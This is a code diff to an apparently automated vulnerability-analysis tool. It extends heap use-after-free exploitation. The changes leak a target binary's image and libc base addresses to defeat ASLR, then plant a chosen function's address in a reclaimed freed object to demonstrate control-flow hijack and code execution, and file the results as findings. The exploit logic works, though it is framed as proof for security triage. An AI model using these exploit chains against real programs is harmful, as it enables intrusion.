@@ -415,6 +415,32 @@ def heap_uaf_leak(workdir: Path, exe: Path, ops: dict, model: dict, width, *, ta
     def _c(opt, **kw):
         return _op_writes(opt, model[opt], width, **kw)
 
+    #: Image bases recovered from any of the strategies below, in the order they were seen.
+    pie_seen: list = []
+
+    def _harvest_pie():
+        """One extra drive to recover the IMAGE base when no earlier strategy happened to show
+        it. The libc strategies win first and their dumps are full of libc pointers, so a target
+        that discloses its own code pointers was still reported with `pie_base: None`
+        **[measured: the exec experiment fell back to the tracer's load base while this function
+        could have had the real one for one more drive]**. The small-chunk view is the dump that
+        shows the OBJECT's bytes, where a surviving code pointer lives.
+        """
+        if pie_seen:
+            return
+        out2 = _drive(workdir, exe, _c(add, idx=0, size=0x18, data=b"P" * 8)
+                      + _c(add, idx=1, size=0x18) + _c(free, idx=0) + _c(view, idx=0),
+                      timeout=timeout)
+        if not out2:
+            return
+        vals2 = _leak._le_pointer_words(out2)
+        try:
+            base2 = _leak.classify_leak(vals2, target_bytes, libc_data).get("pie_base")
+        except Exception:                                # noqa: BLE001 -- advisory
+            base2 = None
+        if base2:
+            pie_seen.append(int(base2))
+
     def _libc_from(out: bytes):
         """A libc base from the Show output, or None. Harvests full 8-byte pointer words AND the
         6-byte little-endian run a printf(\"%s\") viewer leaves when it truncates at the pointer's
@@ -436,6 +462,13 @@ def heap_uaf_leak(workdir: Path, exe: Path, ops: dict, model: dict, width, *, ta
                     if base > 0 and base % 0x1000 == 0:
                         return base, v
         cls = _leak.classify_leak(vals, target_bytes, libc_data)   # a leaked libc CODE pointer
+        # KEEP THE IMAGE BASE. `classify_leak` recovers it from the binary's own symbols and this
+        # function discarded it, which is why a demonstrated redirect had to take its code
+        # address from the tracer's fixed load base and carry an ASLR caveat -- the number it
+        # needed was computed here and dropped. Recorded beside the libc answer, since a leak
+        # that yields both should not have to choose.
+        if cls.get("pie_base"):
+            pie_seen.append(int(cls["pie_base"]))
         return (cls["libc_base"], None) if cls.get("libc_base") else (None, None)
 
     # Strategy 1 -- single large chunk: a >=0x430 request frees straight to the unsorted bin (fd =
@@ -467,8 +500,9 @@ def heap_uaf_leak(workdir: Path, exe: Path, ops: dict, model: dict, width, *, ta
             continue
         base, leaked = _libc_from(out)
         if base:
+            _harvest_pie()
             return {"kind": "libc", "base": base, "leaked": leaked, "dump": out[:400],
-                    "size": show_sz}
+                    "size": show_sz, "pie_base": (pie_seen[0] if pie_seen else None)}
         # No libc pointer, but a freed chunk whose fd is a heap address (0x55/0x56 top byte -- a raw
         # or safe-linked tcache fd) is still a DEMONSTRATED heap-ASLR defeat. On a modern glibc the
         # Nth same-size free often stays in tcache (safe-linked fd) instead of spilling to the
@@ -476,8 +510,9 @@ def heap_uaf_leak(workdir: Path, exe: Path, ops: dict, model: dict, width, *, ta
         if heap_fallback is None:
             hv = next((v for v in _leak._le_pointer_words(out) if (v >> 40) in (0x55, 0x56)), None)
             if hv:
-                heap_fallback = {"kind": "heap", "base": hv, "leaked": hv, "dump": out[:400],
-                                 "size": show_sz}
+                heap_fallback = {"kind": "heap", "base": hv, "leaked": hv,
+                                 "dump": out[:400], "size": show_sz,
+                                 "pie_base": (pie_seen[0] if pie_seen else None)}
     # Strategy 3 -- small single chunk: no libc reachable, but a tcache fd is still a heap-address
     # disclosure (defeats heap ASLR). Separate, so a stray 0x7f value never masquerades as libc.
     out = _drive(workdir, exe, _c(add, idx=0, size=0x18, data=b"P" * 8) + _c(add, idx=1, size=0x18)
@@ -486,8 +521,17 @@ def heap_uaf_leak(workdir: Path, exe: Path, ops: dict, model: dict, width, *, ta
         vals = _leak._le_pointer_words(out)
         heapish = next((v for v in vals if (v >> 40) in (0x55, 0x56)), None)
         if heapish:
+            _harvest_pie()
             return {"kind": "heap", "base": heapish, "leaked": heapish, "dump": out[:400],
-                    "size": 0x18}
+                    "size": 0x18, "pie_base": (pie_seen[0] if pie_seen else None)}
+    _harvest_pie()
+    if heap_fallback is not None and pie_seen and not heap_fallback.get("pie_base"):
+        heap_fallback["pie_base"] = pie_seen[0]
+    if heap_fallback is None and pie_seen:
+        # No libc and no heap pointer, but the IMAGE base is recovered -- which is the one a
+        # redirect into the binary's own code actually needs.
+        return {"kind": "pie", "base": pie_seen[0], "leaked": pie_seen[0], "dump": b"",
+                "size": 0, "pie_base": pie_seen[0]}
     return heap_fallback
 
 
@@ -551,7 +595,7 @@ def heap_uaf_reclaim(workdir: Path, exe: Path, ops: dict, model: dict, width, *,
     return None
 
 
-def _try_uaf_reclaim(ctx, target, exe, workdir, model, opts, width, alloc):
+def _try_uaf_reclaim(ctx, target, exe, workdir, model, opts, width, alloc, traced=None):
     """Run the reclaim experiment and file what it demonstrated. Returns a metrics dict or None.
 
     Filed as its own finding (like the UAF-read leak beside it) rather than as another sentence on
@@ -590,8 +634,34 @@ def _try_uaf_reclaim(ctx, target, exe, workdir, model, opts, width, alloc):
             "status": "demonstrated", "detail": detail,
             "proof": {"type": "uaf-reclaim", "size": hit["size"], "marker": hit["marker"],
                       "view_op": ops["view"], "free_op": ops["free"], "add_op": ops["add"]}}]
+    # The tracer's chain rides along when it got further than the output oracle can: this route
+    # proves the attacker chooses the contents, and only the tracer can show the program CALLING
+    # through them and arriving at code we picked. One finding, both bodies of evidence.
+    _ex = (traced or {}).get("exec")
+    if _ex:
+        _xd = (f"Driven to code execution: with the address of `{_ex.get('function')}` "
+               f"({_ex.get('addr')}, from {_ex.get('addr_source')}) in the reclaim payload, the "
+               f"program called through the dead object and arrived at that function -- observed "
+               f"at a breakpoint on it."
+               + (f" The leaked image base matches the one the tracer measured "
+                  f"({_ex.get('leaked_base')}), so the address does not depend on ASLR being off."
+                  if _ex.get("bases_agree") and _ex.get("addr_source") == "leaked at runtime"
+                  else " The address is absolute and this tracer disables ASLR, so against a "
+                       "live target the same step needs a leak -- no disclosure here recovered "
+                       "the image base."))
+        detail = detail + " " + _xd
+        eff = [{"kind": "rce",
+                "title": (f"Code execution through a reclaimed freed object: "
+                          f"{_ex.get('function')} (demonstrated)"),
+                "status": "demonstrated", "detail": _xd, "proof": dict(_ex)},
+               {"kind": "control-flow-hijack",
+                "title": "Control-flow hijack through a reclaimed freed object (demonstrated)",
+                "status": "demonstrated", "detail": _xd, "proof": dict(_ex)}] + eff
     FindingDAO(ctx.conn).upsert(target.id, target.case_id, {
-        "cwe": "CWE-416", "title": "Use-after-free with a demonstrated reclaim",
+        "cwe": "CWE-416",
+        "title": (f"Use-after-free: reclaimed object redirects execution into "
+                  f"{_ex.get('function')}" if _ex else
+                  "Use-after-free with a demonstrated reclaim"),
         "severity": "critical", "detector": "heap_trace", "state": "corroborated",
         "confidence": 0.95,
         "dedup_key": f"CWE-416:uaf-reclaim:{alloc['free_name']}",
@@ -599,8 +669,10 @@ def _try_uaf_reclaim(ctx, target, exe, workdir, model, opts, width, alloc):
         "evidence": [{"channel": "effects", "detail": _json.dumps(eff)},
                      {"channel": "heap-trace", "detail": detail}]})
     ctx.progress(msg=f"reclaim demonstrated at size {hit['size']:#x} "
-                     f"(a later allocation took the freed chunk)")
-    return {"metrics": {"reclaim": "demonstrated", "reclaim_size": hit["size"]}}
+                     + (f"-> code execution in {_ex.get('function')}" if _ex
+                        else "(a later allocation took the freed chunk)"))
+    return {"metrics": {"reclaim": "demonstrated", "reclaim_size": hit["size"],
+                        "reclaim_exec": (_ex or {}).get("function")}}
 
 
 def _pie_for(target, exe) -> bool:
@@ -678,7 +750,7 @@ def _reclaim_sequence(model: dict, opts: list, width, marker: bytes, size: int =
 
 
 def _try_reclaim_exec(ctx, target, target_bytes, exe, workdir, helper, model, opts, width,
-                      alloc, plt_mode, pie, edges, observation, load_base):
+                      alloc, plt_mode, pie, edges, observation, load_base, leak=None):
     """Drive the demonstrated hijack to CODE EXECUTION: put a chosen function's address in the
     reclaim payload instead of the sentinel, and watch for arrival at it.
 
@@ -704,7 +776,20 @@ def _try_reclaim_exec(ctx, target, target_bytes, exe, workdir, helper, model, op
     name, vaddr = _exploit.find_win(funcs, call_edges=edges)
     if not (name and vaddr):
         return None
-    runtime = (int(load_base or 0) + int(vaddr)) if pie else int(vaddr)
+    # WHERE THE ADDRESS COMES FROM, which is the whole difference between a demonstration that
+    # depends on ASLR being off and one that does not. A leak that recovered the IMAGE base gives
+    # the same number from the target's own output, so prefer it -- and cross-check it against
+    # the base the tracer measured, because two independent routes to one number is the only way
+    # to show the leaked one is right rather than merely present.
+    leaked = int((leak or {}).get("pie_base") or 0) or None
+    traced = int(load_base or 0) or None
+    base, source = (traced, "tracer (ASLR off)")
+    agree = None
+    if pie and leaked:
+        agree = (traced is None or leaked == traced)
+        if agree:
+            base, source = (leaked, "leaked at runtime")
+    runtime = (int(base or 0) + int(vaddr)) if pie else int(vaddr)
     # The payload sits where the pointer the program CALLED was read from, which the hijack
     # evidence already names -- not at offset 0 by assumption.
     at = int(observation.get("offset") or 0)
@@ -733,7 +818,13 @@ def _try_reclaim_exec(ctx, target, target_bytes, exe, workdir, helper, model, op
     if not hit:
         return None
     return {"function": name, "addr": hex(runtime), "vaddr": hex(int(vaddr)),
-            "returns_to": hit.get("returns_to"), "aslr": "off (tracer)"}
+            "returns_to": hit.get("returns_to"),
+            "addr_source": source,
+            "leaked_base": (hex(leaked) if leaked else None),
+            "traced_base": (hex(traced) if traced else None),
+            "bases_agree": agree,
+            "aslr": ("not relied on -- the base was disclosed by the target"
+                     if source == "leaked at runtime" else "off (tracer)")}
 
 
 def _file_traced_reclaim(ctx, target, alloc, observation):
@@ -898,8 +989,14 @@ def _try_uaf_leak(ctx, target, target_bytes, exe, workdir, model, opts, width, a
         "vuln": {"vclass": "uaf", "note": f"{alloc['alloc_name']}/{alloc['free_name']}",
                  "leak": {"kind": hit["kind"], "base": base_hex}}})
     ctx.progress(pct=100, msg=f"UAF read leaks {what} {base_hex} (demonstrated disclosure)")
+    # The HIT travels with the metrics, not just a summary of it: the exec experiment needs the
+    # recovered IMAGE base to build a code address that does not depend on ASLR being off, and
+    # passing the metrics dict in its place quietly handed it `None` **[measured: the chain
+    # reached code execution and reported "no disclosure here recovered the image base" while
+    # this function had the base in hand]**.
     return {"metrics": {"applicable": True, "use_after_free": True, "uaf_leak": hit["kind"],
-                        "base": base_hex}}
+                        "base": base_hex},
+            "leak": hit}
 
 
 def _allocator_ranges(functions: dict, edges, alloc: dict) -> list[list[int]]:
@@ -1110,28 +1207,29 @@ def heap_trace_stage(ctx) -> dict:
         # contents of an object the program still believes it owns", and it is invisible to every
         # other channel here -- the watchpoint tracer sees the use but not who filled the chunk,
         # and the sanitizer path cannot see it at all because ASan quarantines the chunk.
+        # The exec experiment needs the leak's image base, so it runs after `_try_uaf_leak`
+        # above and before the reclaim findings are filed -- its evidence belongs on whichever
+        # of them this target produces.
+        if (reclaim_observed or {}).get("effect", {}).get("kind") == "control-flow-hijack":
+            try:
+                _ex = _try_reclaim_exec(ctx, target, target_bytes, exe, workdir, helper,
+                                        model, opts, width, alloc, plt_mode, pie, edges,
+                                        reclaim_observed, traced_base,
+                                        leak=(leak_hit or {}).get("leak"))
+                if _ex:
+                    reclaim_observed["exec"] = _ex
+            except Exception:
+                pass
         reclaim_hit = None
         try:
-            reclaim_hit = _try_uaf_reclaim(ctx, target, exe, workdir, model, opts, width, alloc)
+            reclaim_hit = _try_uaf_reclaim(ctx, target, exe, workdir, model, opts, width, alloc,
+                                           traced=reclaim_observed)
         except Exception:
             reclaim_hit = None
         # No `view` option, so no output oracle -- which is most targets. The tracer read the
         # chunk instead, and that evidence is filed by the same route so a silent target is not
         # left with "the chunk came back" and nothing more.
         if reclaim_hit is None and reclaim_observed:
-            # A demonstrated hijack earns one more experiment: aim it at a function we choose
-            # and see whether the program executes it. Only then -- the sentinel fault is not
-            # worth spending a run on, and `find_win` refuses to nominate a target it cannot
-            # justify, so most targets stop here.
-            if (reclaim_observed.get("effect") or {}).get("kind") == "control-flow-hijack":
-                try:
-                    _ex = _try_reclaim_exec(ctx, target, target_bytes, exe, workdir, helper,
-                                            model, opts, width, alloc, plt_mode, pie, edges,
-                                            reclaim_observed, traced_base)
-                    if _ex:
-                        reclaim_observed["exec"] = _ex
-                except Exception:
-                    pass
             try:
                 reclaim_hit = _file_traced_reclaim(ctx, target, alloc, reclaim_observed)
             except Exception:
